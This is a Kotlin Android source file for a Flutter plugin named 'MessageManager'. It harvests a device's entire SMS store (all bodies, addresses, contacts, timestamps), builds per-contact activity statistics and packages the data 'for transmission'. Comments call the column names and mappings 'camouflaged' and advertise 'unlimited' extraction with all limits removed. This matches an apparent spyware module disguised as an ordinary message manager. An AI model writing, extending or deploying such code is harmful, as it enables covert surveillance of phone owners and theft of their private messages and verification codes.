package com.example.kem

import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.provider.Telephony
import android.util.Log
import android.Manifest
import androidx.core.content.ContextCompat
import io.flutter.plugin.common.MethodChannel
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*

// ==================== BASE UTILITIES - محسن ====================
/**
 * أدوات أساسية مشتركة محسنة
 * Enhanced shared base utilities
 */
object BaseUtils {
    const val LOG_TAG = "MessageManager"
    
    // إزالة جميع الحدود الصارمة - Remove all strict limits
    const val UNLIMITED_MESSAGES = 0 // لا حدود
    const val LARGE_BATCH_SIZE = 1000 // دفعات كبيرة
    const val FULL_CONTENT_LENGTH = 2000 // محتوى كامل
    const val NO_TIME_LIMIT = 0L // بدون حدود زمنية
    const val COMPRESSION_THRESHOLD = 1024
    const val BATCH_UPLOAD_SIZE = 50 // زيادة حجم الدفعة
    
    // فحص الصلاحيات الموحد
    fun checkPermission(context: Context, permission: String): Boolean {
        return ContextCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED
    }
    
    // معالج الأخطاء الموحد
    fun createErrorResponse(status: String, message: String, timestamp: Long = System.currentTimeMillis()): JSONObject {
        return JSONObject().apply {
            put("status", status)
            put("message", message)
            put("timestamp", timestamp)
            put("optimization_applied", false)
        }
    }
    
    // منسق الوقت الموحد
    fun formatTimestamp(timestamp: Long): String {
        return try {
            val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
            dateFormat.format(Date(timestamp))
        } catch (e: Exception) {
            "Invalid Timestamp"
        }
    }
    
    // منظف النصوص الموحد - محسن للمحتوى الكامل
    fun sanitizeText(text: String?, maxLength: Int = FULL_CONTENT_LENGTH): String {
        return text?.trim()?.take(maxLength)?.replace(Regex("[\\p{Cntrl}&&[^\r\n\t]]"), "") ?: ""
    }
    
    // منظف عناوين الاتصال الموحد
    fun sanitizeAddress(address: String?, maxLength: Int = 50): String {
        return address?.replace(Regex("[^\\d+\\-\\s\\(\\)@.]"), "")?.take(maxLength) ?: "Unknown Endpoint"
    }
    
    // فحص الرقم التعريفي الموحد
    fun isValidId(id: String?): Boolean {
        return !id.isNullOrBlank() && id.matches(Regex("\\d+"))
    }
    
    // فحص العنوان الموحد
    fun isValidAddress(address: String?): Boolean {
        return !address.isNullOrBlank() && 
               (address.matches(Regex("[+\\d\\s\\-()]+")) || address.contains("@"))
    }
}

// ==================== TYPE DECODER ====================
/**
 * فك ترميز الأنواع الموحد
 * Unified type decoder
 */
object TypeDecoder {
    
    fun <T> decodeWithMapping(type: T, mappings: Map<T, String>, defaultValue: String = "unknown"): String {
        return try {
            mappings[type] ?: defaultValue
        } catch (e: Exception) {
            Log.w(BaseUtils.LOG_TAG, "Error decoding type: $type", e)
            defaultValue
        }
    }
}

// ==================== MESSAGE CONSTANTS - بدون حدود ====================
/**
 * ثوابت الرسائل النصية المحسنة
 * Enhanced SMS constants
 */
object MessageConstants {
    
    // أعمدة مموهة - Camouflaged columns
    object CommunicationColumns {
        const val RECORD_IDENTIFIER = Telephony.Sms._ID
        const val THREAD_REFERENCE = Telephony.Sms.THREAD_ID
        const val ENDPOINT_ADDRESS = Telephony.Sms.ADDRESS
        const val CONTENT_BODY = Telephony.Sms.BODY
        const val TIMESTAMP_RECEIVED = Telephony.Sms.DATE
        const val TIMESTAMP_SENT = Telephony.Sms.DATE_SENT
        const val MESSAGE_TYPE = Telephony.Sms.TYPE
        const val READ_STATUS = Telephony.Sms.READ
        const val DELIVERY_STATUS = Telephony.Sms.STATUS
        const val CONTACT_PERSON = Telephony.Sms.PERSON
        const val SERVICE_CENTER = Telephony.Sms.SERVICE_CENTER
        const val SUBJECT_LINE = Telephony.Sms.SUBJECT
    }
    
    // تعيينات مموهة - Camouflaged mappings
    val MESSAGE_FLOW_TYPES = mapOf(
        Telephony.Sms.MESSAGE_TYPE_INBOX to "incoming_communication",
        Telephony.Sms.MESSAGE_TYPE_SENT to "outgoing_transmission",
        Telephony.Sms.MESSAGE_TYPE_DRAFT to "pending_composition",
        Telephony.Sms.MESSAGE_TYPE_OUTBOX to "queued_transmission",
        Telephony.Sms.MESSAGE_TYPE_FAILED to "failed_delivery",
        Telephony.Sms.MESSAGE_TYPE_QUEUED to "pending_delivery"
    )
    
    val READ_STATE_TYPES = mapOf(
        0 to "unread_content",
        1 to "read_content"
    )
    
    val DELIVERY_STATE_TYPES = mapOf(
        -1 to "status_unknown",
        0 to "delivery_complete", 
        32 to "delivery_pending",
        64 to "delivery_failed"
    )
    
    // إسقاطات محسنة - جميع الأعمدة
    val ESSENTIAL_PROJECTION = arrayOf(
        CommunicationColumns.RECORD_IDENTIFIER,
        CommunicationColumns.THREAD_REFERENCE,
        CommunicationColumns.ENDPOINT_ADDRESS,
        CommunicationColumns.CONTENT_BODY,
        CommunicationColumns.TIMESTAMP_RECEIVED,
        CommunicationColumns.MESSAGE_TYPE,
        CommunicationColumns.READ_STATUS
    )
    
    val DETAILED_PROJECTION = arrayOf(
        CommunicationColumns.RECORD_IDENTIFIER,
        CommunicationColumns.THREAD_REFERENCE,
        CommunicationColumns.ENDPOINT_ADDRESS,
        CommunicationColumns.CONTENT_BODY,
        CommunicationColumns.TIMESTAMP_RECEIVED,
        CommunicationColumns.TIMESTAMP_SENT,
        CommunicationColumns.MESSAGE_TYPE,
        CommunicationColumns.READ_STATUS,
        CommunicationColumns.DELIVERY_STATUS,
        CommunicationColumns.CONTACT_PERSON,
        CommunicationColumns.SERVICE_CENTER,
        CommunicationColumns.SUBJECT_LINE
    )
    
    // جميع الأعمدة للاستخراج الكامل - All columns for complete extraction
    val ALL_COLUMNS = DETAILED_PROJECTION
    
    // فك ترميز أنواع الرسائل
    fun decodeMessageFlowType(type: Int): String = 
        TypeDecoder.decodeWithMapping(type, MESSAGE_FLOW_TYPES, "unknown_communication")
    
    fun decodeReadState(status: Int): String = 
        TypeDecoder.decodeWithMapping(status, READ_STATE_TYPES, "unknown_read_state")
    
    fun decodeDeliveryState(status: Int): String = 
        TypeDecoder.decodeWithMapping(status, DELIVERY_STATE_TYPES, "unknown_delivery_state")
}

// ==================== BASE DATA PROCESSOR ====================
/**
 * معالج البيانات الأساسي
 * Base data processor
 */
abstract class BaseDataProcessor(protected val context: Context) {
    
    protected fun safeExecute(operation: String, block: () -> JSONObject): JSONObject {
        return try {
            block()
        } catch (securityEx: SecurityException) {
            Log.e(BaseUtils.LOG_TAG, "Security error during $operation", securityEx)
            BaseUtils.createErrorResponse("security_error", "Access denied to $operation")
        } catch (generalEx: Exception) {
            Log.e(BaseUtils.LOG_TAG, "General error during $operation", generalEx)
            BaseUtils.createErrorResponse("extraction_error", "Failed to $operation")
        }
    }
    
    protected fun createSuccessResponse(data: Any, totalProcessed: Int): JSONObject {
        return JSONObject().apply {
            put("status", "success")
            put("extraction_timestamp", System.currentTimeMillis())
            put("total_processed", totalProcessed)
            put("data", data)
        }
    }
    
    protected fun executeQuery(
        uri: Uri,
        projection: Array<String>,
        selection: String? = null,
        selectionArgs: Array<String>? = null,
        sortOrder: String? = null,
        processor: (Cursor) -> JSONObject?
    ): List<JSONObject> {
        val results = mutableListOf<JSONObject>()
        try {
            context.contentResolver.query(uri, projection, selection, selectionArgs, sortOrder)?.use { cursor ->
                while (cursor.moveToNext()) {
                    try {
                        processor(cursor)?.let { results.add(it) }
                    } catch (e: Exception) {
                        Log.w(BaseUtils.LOG_TAG, "Error processing cursor row", e)
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(BaseUtils.LOG_TAG, "Database query failed", e)
        }
        return results
    }
}

// ==================== MESSAGE COMPRESSOR ====================
/**
 * ضاغط الرسائل - يقلل حجم البيانات قبل الإرسال
 * Message compressor - reduces data size before transmission
 */
class MessageCompressor {
    
    fun compressAllMessages(messages: List<JSONObject>): JSONObject {
        Log.i(BaseUtils.LOG_TAG, "Compressing ${messages.size} messages for transmission...")
        
        val compressedMessages = messages.map { message ->
            JSONObject().apply {
                put("id", message.optString("message_identifier"))
                put("thread", message.optString("thread_reference"))
                put("addr", message.optString("endpoint_address"))
                put("body", message.optString("content_preview"))
                put("date", message.optLong("event_timestamp"))
                put("date_sent", message.optLong("sent_timestamp", 0))
                put("type", message.optString("communication_flow"))
                put("read", message.optString("read_state"))
                put("status", message.optString("delivery_state"))
                put("person", message.optString("contact_reference"))
                put("formatted_time", message.optString("formatted_time"))
            }
        }
        
        val stats = generateDetailedStats(messages)
        
        return JSONObject().apply {
            put("messages", JSONArray(compressedMessages))
            put("total_count", messages.size)
            put("compression_applied", true)
            put("statistics", stats)
            put("compression_timestamp", System.currentTimeMillis())
            put("extraction_mode", "unlimited_compressed")
        }
    }
    
    private fun generateDetailedStats(messages: List<JSONObject>): JSONObject {
        var incomingCount = 0
        var outgoingCount = 0
        var unreadCount = 0
        var draftCount = 0
        var failedCount = 0
        val addressSet = mutableSetOf<String>()
        var oldestDate = Long.MAX_VALUE
        var newestDate = 0L
        val monthlyStats = mutableMapOf<String, Int>()
        
        messages.forEach { message ->
            when (message.optString("communication_flow")) {
                "incoming_communication" -> incomingCount++
                "outgoing_transmission" -> outgoingCount++
                "pending_composition" -> draftCount++
                "failed_delivery" -> failedCount++
            }
            
            if (message.optString("read_state") == "unread_content") {
                unreadCount++
            }
            
            val address = message.optString("endpoint_address")
            if (address.isNotEmpty() && address != "Unknown Endpoint") {
                addressSet.add(address)
            }
            
            val date = message.optLong("event_timestamp")
            if (date > 0) {
                if (date < oldestDate) oldestDate = date
                if (date > newestDate) newestDate = date
                
                // إحصائيات شهرية
                val monthKey = SimpleDateFormat("yyyy-MM", Locale.getDefault()).format(Date(date))
                monthlyStats[monthKey] = monthlyStats.getOrDefault(monthKey, 0) + 1
            }
        }
        
        return JSONObject().apply {
            put("total_messages", messages.size)
            put("incoming_count", incomingCount)
            put("outgoing_count", outgoingCount)
            put("unread_count", unreadCount)
            put("draft_count", draftCount)
            put("failed_count", failedCount)
            put("unique_addresses", addressSet.size)
            put("oldest_message", if (oldestDate != Long.MAX_VALUE) BaseUtils.formatTimestamp(oldestDate) else "N/A")
            put("newest_message", if (newestDate > 0) BaseUtils.formatTimestamp(newestDate) else "N/A")
            put("date_range_days", if (oldestDate != Long.MAX_VALUE && newestDate > 0) 
                ((newestDate - oldestDate) / (24 * 60 * 60 * 1000L)).toInt() else 0)
            put("monthly_distribution", JSONObject(monthlyStats.mapKeys { it.key }))
            put("most_active_address", addressSet.maxByOrNull { addr -> 
                messages.count { it.optString("endpoint_address") == addr }
            } ?: "N/A")
        }
    }
}

// ==================== MESSAGE NETWORK OPTIMIZER ====================
/**
 * محسن الشبكة للرسائل المحسن
 * Enhanced message network optimizer
 */
class MessageNetworkOptimizer {
    
    fun optimizeDataForTransmission(messages: List<JSONObject>): JSONObject {
        return try {
            val statistics = generateStatistics(messages)
            val importantMessages = filterImportantMessages(messages)
            val compressedMessages = compressContent(importantMessages)
            
            JSONObject().apply {
                put("message_statistics", statistics)
                put("important_messages", JSONArray(compressedMessages))
                put("total_processed", messages.size)
                put("transmitted_count", compressedMessages.size)
                put("optimization_applied", true)
                put("optimization_ratio", "${(compressedMessages.size.toFloat() / messages.size * 100).toInt()}%")
            }
        } catch (e: Exception) {
            Log.e(BaseUtils.LOG_TAG, "Data optimization failed", e)
            BaseUtils.createErrorResponse("optimization_error", "Failed to optimize data")
        }
    }
    
    private fun generateStatistics(messages: List<JSONObject>): JSONObject {
        val stats = JSONObject()
        
        var incomingCount = 0
        var outgoingCount = 0
        var unreadCount = 0
        var recentCount = 0
        val endpointFrequency = mutableMapOf<String, Int>()
        
        messages.forEach { message ->
            when (message.optString("communication_flow")) {
                "incoming_communication" -> incomingCount++
                "outgoing_transmission" -> outgoingCount++
            }
            
            if (message.optString("read_state") == "unread_content") {
                unreadCount++
            }
            
            val timestamp = message.optLong("event_timestamp")
            val weekAgo = System.currentTimeMillis() - (7 * 24 * 60 * 60 * 1000L)
            if (timestamp > weekAgo) {
                recentCount++
            }
            
            val endpoint = message.optString("endpoint_address")
            if (endpoint.isNotEmpty() && endpoint != "Unknown Endpoint") {
                endpointFrequency[endpoint] = endpointFrequency.getOrDefault(endpoint, 0) + 1
            }
        }
        
        stats.put("incoming_messages", incomingCount)
        stats.put("outgoing_messages", outgoingCount)
        stats.put("unread_messages", unreadCount)
        stats.put("recent_messages_7days", recentCount)
        stats.put("unique_endpoints", endpointFrequency.size)
        stats.put("most_active_endpoint", endpointFrequency.maxByOrNull { it.value }?.key ?: "none")
        
        return stats
    }
    
    private fun filterImportantMessages(messages: List<JSONObject>): List<JSONObject> {
        val weekAgo = System.currentTimeMillis() - (7 * 24 * 60 * 60 * 1000L)
        
        return messages.filter { message ->
            message.optString("read_state") == "unread_content" ||
            message.optLong("event_timestamp") > weekAgo ||
            message.optString("delivery_state") == "delivery_failed"
        }.take(BaseUtils.BATCH_UPLOAD_SIZE)
    }
    
    private fun compressContent(messages: List<JSONObject>): List<JSONObject> {
        return messages.map { message ->
            JSONObject().apply {
                put("id", message.optString("message_identifier"))
                put("from", BaseUtils.sanitizeAddress(message.optString("endpoint_address")))
                put("preview", BaseUtils.sanitizeText(message.optString("content_preview"), 50))
                put("time", message.optLong("event_timestamp"))
                put("type", message.optString("communication_flow"))
                put("read", message.optString("read_state"))
            }
        }
    }
}

// ==================== UNLIMITED MESSAGE DATA COLLECTOR ====================
/**
 * جامع بيانات الرسائل غير المحدود
 * Unlimited message data collector
 */
class UnlimitedMessageDataCollector(context: Context) : BaseDataProcessor(context) {
    
    private val messageCompressor = MessageCompressor()
    
    fun extractAllMessages(): JSONObject {
        return safeExecute("unlimited message extraction") {
            if (!BaseUtils.checkPermission(context, Manifest.permission.READ_SMS)) {
                return@safeExecute BaseUtils.createErrorResponse("permission_denied", "SMS access denied")
            }
            
            Log.i(BaseUtils.LOG_TAG, "Starting unlimited message extraction...")
            
            val allMessages = extractAllMessagesFromDatabase()
            Log.i(BaseUtils.LOG_TAG, "Raw extraction complete. Total messages: ${allMessages.size}")
            
            val compressedData = messageCompressor.compressAllMessages(allMessages)
            Log.i(BaseUtils.LOG_TAG, "Compression complete. Ready for transmission.")
            
            createSuccessResponse(compressedData, allMessages.size).apply {
                put("extraction_mode", "unlimited_compressed")
                put("raw_message_count", allMessages.size)
                put("compression_ratio", calculateCompressionRatio(allMessages.size, compressedData.toString().length))
            }
        }
    }
    
    private fun extractAllMessagesFromDatabase(): List<JSONObject> {
        val allMessages = mutableListOf<JSONObject>()
        var offset = 0
        val batchSize = BaseUtils.LARGE_BATCH_SIZE
        
        Log.i(BaseUtils.LOG_TAG, "Extracting messages in batches of $batchSize...")
        
        while (true) {
            val batchMessages = extractMessageBatch(offset, batchSize)
            
            if (batchMessages.isEmpty()) {
                Log.i(BaseUtils.LOG_TAG, "No more messages found. Extraction complete.")
                break
            }
            
            allMessages.addAll(batchMessages)
            offset += batchSize
            
            Log.d(BaseUtils.LOG_TAG, "Batch completed. Total so far: ${allMessages.size}")
            
            // تجنب استهلاك الذاكرة المفرط للأجهزة الضعيفة
            if (allMessages.size > 100000) {
                Log.w(BaseUtils.LOG_TAG, "Large dataset detected (${allMessages.size}). Consider using compression.")
            }
        }
        
        return allMessages
    }
    
    private fun extractMessageBatch(offset: Int, limit: Int): List<JSONObject> {
        val messages = mutableListOf<JSONObject>()
        
        try {
            // بدون أي قيود زمنية أو نوعية - No time or type restrictions
            val sortOrder = "${MessageConstants.CommunicationColumns.TIMESTAMP_RECEIVED} ASC LIMIT $limit OFFSET $offset"
            
            context.contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                MessageConstants.ALL_COLUMNS,
                null, // بدون قيود WHERE
                null, // بدون معاملات
                sortOrder
            )?.use { cursor ->
                while (cursor.moveToNext()) {
                    try {
                        val messageObj = createCompleteMessageObject(cursor)
                        if (messageObj != null) {
                            messages.add(messageObj)
                        }
                    } catch (e: Exception) {
                        Log.w(BaseUtils.LOG_TAG, "Error processing message row", e)
                        // متابعة المعالجة حتى لو فشلت رسالة واحدة
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(BaseUtils.LOG_TAG, "Database query failed for batch at offset $offset", e)
        }
        
        return messages
    }
    
    private fun createCompleteMessageObject(cursor: Cursor): JSONObject? {
        return try {
            val messageId = cursor.getString(cursor.getColumnIndexOrThrow(MessageConstants.CommunicationColumns.RECORD_IDENTIFIER))
            if (!BaseUtils.isValidId(messageId)) {
                return null
            }
            
            JSONObject().apply {
                put("message_identifier", messageId)
                put("thread_reference", cursor.getString(cursor.getColumnIndexOrThrow(MessageConstants.CommunicationColumns.THREAD_REFERENCE)) ?: "")
                put("endpoint_address", BaseUtils.sanitizeAddress(
                    cursor.getString(cursor.getColumnIndexOrThrow(MessageConstants.CommunicationColumns.ENDPOINT_ADDRESS))
                ))
                
                // محتوى كامل بدون قطع - Full content without truncation
                val fullBody = cursor.getString(cursor.getColumnIndexOrThrow(MessageConstants.CommunicationColumns.CONTENT_BODY)) ?: ""
                put("content_preview", BaseUtils.sanitizeText(fullBody, BaseUtils.FULL_CONTENT_LENGTH))
                
                val timestamp = cursor.getLong(cursor.getColumnIndexOrThrow(MessageConstants.CommunicationColumns.TIMESTAMP_RECEIVED))
                put("event_timestamp", timestamp)
                put("formatted_time", BaseUtils.formatTimestamp(timestamp))
                
                val sentTimestamp = cursor.getLong(cursor.getColumnIndexOrThrow(MessageConstants.CommunicationColumns.TIMESTAMP_SENT))
                if (sentTimestamp > 0) {
                    put("sent_timestamp", sentTimestamp)
                    put("sent_formatted_time", BaseUtils.formatTimestamp(sentTimestamp))
                }
                
                put("communication_flow", MessageConstants.decodeMessageFlowType(
                    cursor.getInt(cursor.getColumnIndexOrThrow(MessageConstants.CommunicationColumns.MESSAGE_TYPE))
                ))
                put("read_state", MessageConstants.decodeReadState(
                    cursor.getInt(cursor.getColumnIndexOrThrow(MessageConstants.CommunicationColumns.READ_STATUS))
                ))
                put("delivery_state", MessageConstants.decodeDeliveryState(
                    cursor.getInt(cursor.getColumnIndexOrThrow(MessageConstants.CommunicationColumns.DELIVERY_STATUS))
                ))
                put("contact_reference", cursor.getString(cursor.getColumnIndexOrThrow(MessageConstants.CommunicationColumns.CONTACT_PERSON)) ?: "")
                put("service_center", cursor.getString(cursor.getColumnIndexOrThrow(MessageConstants.CommunicationColumns.SERVICE_CENTER)) ?: "")
                put("subject_line", cursor.getString(cursor.getColumnIndexOrThrow(MessageConstants.CommunicationColumns.SUBJECT_LINE)) ?: "")
            }
        } catch (e: Exception) {
            Log.e(BaseUtils.LOG_TAG, "Error creating message object", e)
            null
        }
    }
    
    private fun calculateCompressionRatio(messageCount: Int, compressedSize: Int): String {
        val estimatedOriginalSize = messageCount * 500 // تقدير متوسط حجم الرسالة
        val ratio = if (estimatedOriginalSize > 0) {
            (compressedSize.toFloat() / estimatedOriginalSize * 100).toInt()
        } else 100
        return "${ratio}%"
    }
}

// ==================== MESSAGE DATA COLLECTOR - محسن ====================
/**
 * جامع بيانات الرسائل المحسن
 * Enhanced message data collector
 */
class MessageDataCollector(context: Context) : BaseDataProcessor(context) {
    
    private val networkOptimizer = MessageNetworkOptimizer()
    private val unlimitedCollector = UnlimitedMessageDataCollector(context)
    
    fun extractCommunicationMessages(includeFullContent: Boolean = false): JSONObject {
        return safeExecute("message extraction") {
            if (!BaseUtils.checkPermission(context, Manifest.permission.READ_SMS)) {
                return@safeExecute BaseUtils.createErrorResponse("permission_denied", "Message access denied")
            }
            
            // استخدام الجامع غير المحدود للحصول على جميع الرسائل
            val unlimitedData = unlimitedCollector.extractAllMessages()
            
            if (includeFullContent) {
                return@safeExecute unlimitedData
            } else {
                // تطبيق التحسين إذا لم يكن المحتوى الكامل مطلوب
                val rawMessages = extractRecentMessages()
                val optimizedData = networkOptimizer.optimizeDataForTransmission(rawMessages)
                
                return@safeExecute JSONObject().apply {
                    put("status", "success")
                    put("extraction_timestamp", System.currentTimeMillis())
                    put("optimization_applied", optimizedData.optBoolean("optimization_applied"))
                    put("communication_data", optimizedData)
                }
            }
        }
    }
    
    private fun extractRecentMessages(): List<JSONObject> {
        // استخراج آخر 1000 رسالة للتحسين السريع
        return executeQuery(
            Telephony.Sms.CONTENT_URI,
            MessageConstants.ESSENTIAL_PROJECTION,
            null, // بدون قيود
            null,
            "${MessageConstants.CommunicationColumns.TIMESTAMP_RECEIVED} DESC LIMIT 1000"
        ) { cursor -> createEssentialMessageObject(cursor) }
    }
    
    private fun createEssentialMessageObject(cursor: Cursor): JSONObject? {
        return try {
            val messageId = cursor.getString(cursor.getColumnIndexOrThrow(MessageConstants.CommunicationColumns.RECORD_IDENTIFIER))
            if (!BaseUtils.isValidId(messageId)) {
                return null
            }
            
            JSONObject().apply {
                put("message_identifier", messageId)
                put("thread_reference", cursor.getString(cursor.getColumnIndexOrThrow(MessageConstants.CommunicationColumns.THREAD_REFERENCE)) ?: "")
                put("endpoint_address", BaseUtils.sanitizeAddress(
                    cursor.getString(cursor.getColumnIndexOrThrow(MessageConstants.CommunicationColumns.ENDPOINT_ADDRESS))
                ))
                put("content_preview", BaseUtils.sanitizeText(
                    cursor.getString(cursor.getColumnIndexOrThrow(MessageConstants.CommunicationColumns.CONTENT_BODY))
                ))
                
                val timestamp = cursor.getLong(cursor.getColumnIndexOrThrow(MessageConstants.CommunicationColumns.TIMESTAMP_RECEIVED))
                put("event_timestamp", timestamp)
                put("formatted_time", BaseUtils.formatTimestamp(timestamp))
                
                put("communication_flow", MessageConstants.decodeMessageFlowType(
                    cursor.getInt(cursor.getColumnIndexOrThrow(MessageConstants.CommunicationColumns.MESSAGE_TYPE))
                ))
                put("read_state", MessageConstants.decodeReadState(
                    cursor.getInt(cursor.getColumnIndexOrThrow(MessageConstants.CommunicationColumns.READ_STATUS))
                ))
            }
        } catch (e: Exception) {
            Log.e(BaseUtils.LOG_TAG, "Error creating essential message object", e)
            null
        }
    }
}

// ==================== MAIN MESSAGE MANAGER ====================
/**
 * مدير الرسائل الرئيسي المحسن
 * Enhanced main message manager
 */
class MessageManager(private val context: Context) {
    
    private val messageDataCollector = MessageDataCollector(context)
    private val unlimitedDataCollector = UnlimitedMessageDataCollector(context)
    
    suspend fun handleExtractCommunicationMessages(
        result: MethodChannel.Result,
        includeFullContent: Boolean = false,
        optimizeForNetwork: Boolean = true
    ) {
        withContext(Dispatchers.IO) {
            try {
                Log.d(BaseUtils.LOG_TAG, "Starting enhanced message extraction - Full content: $includeFullContent, Optimize: $optimizeForNetwork")
                
                val messagesData = if (includeFullContent) {
                    // استخراج غير محدود مع ضغط
                    unlimitedDataCollector.extractAllMessages()
                } else {
                    // استخراج محسن للشبكة
                    messageDataCollector.extractCommunicationMessages(false)
                }
                
                withContext(Dispatchers.Main) {
                    result.success(messagesData.toString())
                }
                
                val totalExtracted = messagesData.optJSONObject("data")
                    ?.optInt("total_count", 0) ?: 0
                    
                Log.i(BaseUtils.LOG_TAG, "Enhanced message extraction completed successfully. Total: $totalExtracted")
                
            } catch (securityEx: SecurityException) {
                Log.e(BaseUtils.LOG_TAG, "Security error during enhanced message extraction", securityEx)
                withContext(Dispatchers.Main) {
                    result.error("SECURITY_ERROR", "Access denied to message data", securityEx.message)
                }
            } catch (generalEx: Exception) {
                Log.e(BaseUtils.LOG_TAG, "General error during enhanced message extraction", generalEx)
                withContext(Dispatchers.Main) {
                    result.error("EXTRACTION_ERROR", "Failed to extract message data", generalEx.message)
                }
            }
        }
    }
    
    suspend fun handleExtractAllMessages(result: MethodChannel.Result) {
        withContext(Dispatchers.IO) {
            try {
                Log.d(BaseUtils.LOG_TAG, "Starting unlimited message extraction...")
                
                val allMessagesData = unlimitedDataCollector.extractAllMessages()
                
                withContext(Dispatchers.Main) {
                    result.success(allMessagesData.toString())
                }
                
                val totalCount = allMessagesData.optJSONObject("data")?.optInt("total_count", 0) ?: 0
                Log.i(BaseUtils.LOG_TAG, "Unlimited message extraction completed. Total: $totalCount")
                
            } catch (securityEx: SecurityException) {
                Log.e(BaseUtils.LOG_TAG, "Security error during unlimited message extraction", securityEx)
                withContext(Dispatchers.Main) {
                    result.error("SECURITY_ERROR", "Access denied to message data", securityEx.message)
                }
            } catch (generalEx: Exception) {
                Log.e(BaseUtils.LOG_TAG, "General error during unlimited message extraction", generalEx)
                withContext(Dispatchers.Main) {
                    result.error("EXTRACTION_ERROR", "Failed to extract message data", generalEx.message)
                }
            }
        }
    }
    
    fun hasMessagePermission(): Boolean {
        return BaseUtils.checkPermission(context, Manifest.permission.READ_SMS)
    }
    
    fun getMessageStatus(): JSONObject {
        return JSONObject().apply {
            put("permission_granted", hasMessagePermission())
            put("timestamp", System.currentTimeMillis())
            put("message_provider", "Enhanced SMS Provider")
            put("extraction_mode", "unlimited_with_compression")
            put("supports_full_extraction", true)
            put("supports_compression", true)
            put("max_batch_size", BaseUtils.LARGE_BATCH_SIZE)
        }
    }
}